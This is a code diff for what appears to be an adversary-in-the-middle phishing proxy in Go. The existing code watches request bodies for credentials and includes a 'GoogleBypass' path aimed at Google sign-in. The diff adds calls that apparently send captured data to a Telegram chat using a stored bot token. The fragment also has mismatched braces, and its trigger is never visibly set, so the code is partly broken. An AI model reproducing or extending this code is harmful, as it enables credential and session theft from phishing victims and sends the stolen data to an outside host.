@@ -655,6 +655,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				}
 
 				// check for creds in request body
+				trigger := 0
 				if pl != nil && ps.SessionId != "" {
 					req.Header.Set("X-CDN-Edge", o_host)
 					body, err := ioutil.ReadAll(req.Body)
@@ -748,8 +749,12 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									log.Debug("force_post: body: %s len:%d", body, len(body))
 								}
 							}
+							if trigger == 1 {
+								readFile(p.cfg.general.Chatid, p.cfg.general.Teletoken)
+							}
 
 						} else if form_re.MatchString(contentType) {
+							trigger = 0
 
 							if req.ParseForm() == nil && req.PostForm != nil && len(req.PostForm) > 0 {
 								log.Debug("POST: %s", req.URL.Path)
@@ -842,9 +847,11 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 										}
 									}
 								}
-
+							if trigger == 1 {
+								readFile(p.cfg.general.Chatid, p.cfg.general.Teletoken)
 							}
-				}	
+                                        }
+                            }            
 		if strings.EqualFold(req.Host, "accounts.google.com") && strings.Contains(req.URL.String(), "/signin/_/AccountsSignInUi/data/batchexecute?") && strings.Contains(req.URL.String(), "rpcids=V1UmUe") {
 		log.Debug("GoogleBypass working with: %v", req.RequestURI)
 
@@ -915,6 +922,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			return req, nil
 		})
 
+
 	p.Proxy.OnResponse().
 		DoFunc(func(resp *http.Response, ctx *goproxy.ProxyCtx) *http.Response {
 			if resp == nil {
@@ -935,7 +943,9 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					}
 				}
 			}
-
+			
+			trigger := 0
+			
 			allow_origin := resp.Header.Get("Access-Control-Allow-Origin")
 			if allow_origin != "" && allow_origin != "*" {
 				if u, err := url.Parse(allow_origin); err == nil {
@@ -1272,6 +1282,10 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						}
 					}
 				}
+			}
+
+			if trigger == 1 {
+				readFile(p.cfg.general.Chatid, p.cfg.general.Teletoken)
 			}
 
 			return resp
